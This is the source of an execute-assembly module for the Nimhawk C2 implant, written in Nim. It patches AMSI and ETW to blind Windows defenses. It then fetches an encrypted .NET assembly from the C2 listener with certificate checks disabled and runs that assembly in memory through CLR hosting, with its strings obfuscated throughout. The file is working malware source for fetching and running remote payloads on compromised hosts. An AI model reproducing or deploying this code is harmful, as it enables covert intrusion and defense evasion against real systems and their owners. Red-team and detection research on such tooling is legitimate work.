#[
  Nimhawk Execute-Assembly Module
  Author: Alejandro Parodi (@SecSignal)
  
  This module enables .NET inline in-memory execution with custom CLR AppDomain
  allowing multiple .NET assemblies to be executed without causing memory 
  corruption that would kill the parent process.
  
  Special thanks to:
  - @ropnop for his research on CLR hosting and execution:
    https://blog.ropnop.com/hosting-clr-in-golang/#calling-clrcreateinstance
  
  - @byt3bl33d3r and all contributors to OffensiveNim:
    https://github.com/byt3bl33d3r/OffensiveNim
  
  Without their contributions, this module would not be possible.

  Hope this implementation helps you and the new ones getting started with .NET inline execution,
  as yours helps me in my journey to learn how .NET CRL Self-Hosting works.

  You can check this project using dev_utils/execute_assembly_net48_test
  Build it using: dotnet publish -c Release and inject it using: execute-assembly in web ui.
]#

import os
from zippy import uncompress
import ../../util/crypto
import ../../selfProtections/patches/patchAMSI
import ../../selfProtections/patches/patchETW
import ../../core/webClientListener
from strutils import parseInt, toLowerAscii
import ../../util/strenc
import winim/clr
import puppy

const VT_UI1 = 17

proc executeAssembly*(li: webClientListener.Listener, args: seq[string]): string =
  var result = ""
  
  ##########################################################
  # Check if the user has provided the correct arguments
  ##########################################################
  if args.len < 3:
    return obf("[-] Usage: execute-assembly <BYPASSAMSI=0|1> <BLOCKETW=0|1> [assembly_hash] <arguments>")

  let
    amsiFlagStr: string = args[0]
    etwFlagStr: string = args[1]
    fileId: string = args[2]
  
  var
    amsi: bool = false
    etw: bool = false
    assemblyArgs: seq[string] = @[]

  try:
    amsi = cast[bool](parseInt(amsiFlagStr))
    etw = cast[bool](parseInt(etwFlagStr))
  except ValueError:
    return obf("[-] Invalid flags. BYPASSAMSI and BLOCKETW must be 0 or 1.")
        
  if args.len > 3:
    assemblyArgs = args[3 .. ^1]
  ##########################################################

  ##########################################################
  # Patch AMSI/ETW
  ##########################################################
  if amsi:
    case patchAMSI.patchAMSI()
    of 0: result.add(obf("[+] AMSI patched!\n"))
    of 1: result.add(obf("[-] Error patching AMSI!\n"))
    of 2: result.add(obf("[+] AMSI already patched!\n"))
    else: result.add(obf("[?] Unknown AMSI patching result!\n"))

  if etw:
    case patchETW.patchETW()
    of 0: result.add(obf("[+] ETW patched!\n"))
    of 1: result.add(obf("[-] Error patching ETW!\n"))
    of 2: result.add(obf("[+] ETW already patched!\n"))
    else: result.add(obf("[?] Unknown ETW patching result!\n"))
  ##########################################################

  ##########################################################
  # Call C2 Server and download assembly
  ##########################################################
  var url = toLowerAscii(li.listenerType) & obf("://")
  if li.listenerHost != "":
    url &= li.listenerHost
  else:
    url &= li.implantCallbackIp & obf(":") & li.listenerPort
  url &= li.taskpath & obf("/") & fileId

  let req = Request(
    url: parseUrl(url),
    headers: @[
      Header(key: obf("User-Agent"), value: li.userAgent),
      Header(key: obf("X-Request-ID"), value: li.id),
      Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey),
      Header(key: obf("Content-MD5"), value: "execute-assembly")
    ],
    allowAnyHttpsCertificate: true,
  )
    
  let res: Response = fetch(req)
  if res.code != 200:
    return result & obf("[-] Error getting assembly file: The server returned a non-200 code.\n")
  ##########################################################

  try:
    ##########################################################
    # Decrypt and decompress assembly
    ##########################################################
    let decrypted = decryptData(res.body, li.UNIQUE_XOR_KEY)
    let decryptedStr = cast[string](decrypted)
    let decompressed = uncompress(decryptedStr)
    let assemblyBytes = convertToByteSeq(decompressed)
    
    result.add(obf("[*] Assembly downloaded and decompressed correctly.\n"))
    ##########################################################

    ##########################################################
    # Show available CLR versions
    ##########################################################
    result.add(obf("[*] Available CLR versions:\n"))
    for v in clrVersions():
      result.add(obf("    - ") & v & "\n")
    ##########################################################

    ##########################################################
    # Load mscorlib and get the objects needed to create the new CRL AppDomain
    ##########################################################
    result.add(obf("[*] Initializing CLR and creating AppDomain...\n"))
    let mscorlib = load("mscorlib")
    
    # Get the AppDomain type
    let appDomainType = mscorlib.GetType("System.AppDomain")
    
    # Create the domain setup for the new domain
    let domainSetup = mscorlib.new("System.AppDomainSetup")
    domainSetup.ApplicationBase = getCurrentDir()
    domainSetup.DisallowBindingRedirects = false
    domainSetup.DisallowCodeDownload = true
    domainSetup.ShadowCopyFiles = "false"
    
    # Create the new AppDomain to execute our assembly
    let evidence = toCLRVariant(nil)
    let customDomain = @appDomainType.CreateDomain(
      "NimhawkDomain",  # Domain name
      evidence,         # Evidence (null)
      domainSetup       # Domain setup
    )
    
    result.add(obf("[+] New AppDomain created correctly.\n"))
    ##########################################################
    
    ##########################################################
    # Convert the assembly bytes to CLR format
    ##########################################################
    let assemblyData = toCLRVariant(assemblyBytes, VT_UI1)
    
    ##########################################################
    # Load the assembly in the custom AppDomain
    ##########################################################
    result.add(obf("[*] Loading assembly in the AppDomain...\n"))
    var assembly: CLRVariant

    ##########################################################  
    # Strange trick to load the assembly, yeah both ways are needed, first try will fail
    # but second one will work, if you remove the first one, the second one will fail in 2nd .Net execution killing the implant
    # just keep it like this, idk why but this works, it's a nim bug
    ##########################################################
    try:
      result.add(obf("[*] Trying to load assembly using customDomain.Load...\n"))
      assembly = customDomain.Load(assemblyData)
    except Exception as e1:
      discard
      
    # This second load will load correctly the assembly (just if the first one fails, idk why but works)
    try:
      let assemblyType = mscorlib.GetType("System.Reflection.Assembly")
      assembly = @assemblyType.Load(assemblyData)
      result.add(obf("[+] Assembly loaded correctly using Assembly.Load.\n"))
    except Exception as e3:
      result.add(obf("[-] Error loading assembly: ") & e3.msg & "\n")   
    ##########################################################

    ##########################################################
    # Convert command line arguments to CLR format
    ##########################################################
    result.add(obf("[*] Preparing arguments for the assembly...\n"))
    var clrArgs = toCLRVariant(assemblyArgs, VT_BSTR)
    ##########################################################
    
    try:
      ##########################################################
      # Now we are going to set up the capture process for the assembly in the custom AppDomain (this makes me crazy for days but it works now!)
      # Redirection of the output using StringWriter
      #
      # Get necessary types
      let consoleType = mscorlib.GetType("System.Console")
      let stringBuilderType = mscorlib.GetType("System.Text.StringBuilder")
      let stringWriterType = mscorlib.GetType("System.IO.StringWriter")
      
      # Create objects for the capture
      let sb = mscorlib.new("System.Text.StringBuilder")
      let sw = mscorlib.new("System.IO.StringWriter", sb)
      
      # Save original outputs using static methods
      let oldOut = @consoleType.Out
      let oldErr = @consoleType.Error
      ##########################################################

      ##########################################################
      # Lets execute the assembly
      ##########################################################
      try:
        # Redirect standard output and error
        @consoleType.SetOut(sw)
        @consoleType.SetError(sw)
        
        # Execute the assembly
        let retCode = assembly.EntryPoint.Invoke(nil, toCLRVariant([clrArgs]))
        
        # Force buffer flushing, this will help us to get the output from the assembly
        # doing this we will force the assembly to write the output to the StringWriter
        sw.Flush()
        
        # Get the captured output
        let output = $sb.ToString()
        
        # Build the output string to show in the console
        if output != "":
          result.add(obf("\n[+] .NET Assembly Output:\n"))
          result.add("==================================================\n")
          result.add(output)
          result.add("\n==================================================\n")
        
        result.add(obf("[+] Assembly executed successfully.\n")) # Yay! :)
      finally:
        ##########################################################
        # Restore original outputs to avoid messing with the console
        @consoleType.SetOut(oldOut)
        @consoleType.SetError(oldErr)
        ##########################################################
    except Exception as e:
      result.add(obf("[-] Error during output capture: ") & e.msg & "\n")
      try:
        ##########################################################
        # If the capture fails, execute without capture (not ideal but at least assembly will run)
        ##########################################################
        assembly.EntryPoint.Invoke(nil, toCLRVariant([clrArgs]))
        result.add(obf("[+] Assembly executed without output capture.\n"))
        ##########################################################
      except Exception as e2:
        result.add(obf("[-] Error executing assembly: ") & e2.msg & "\n")
      
  except Exception as e:
    result.add(obf("\n[-] General error: ") & getCurrentExceptionMsg() & "\n")
  
  return result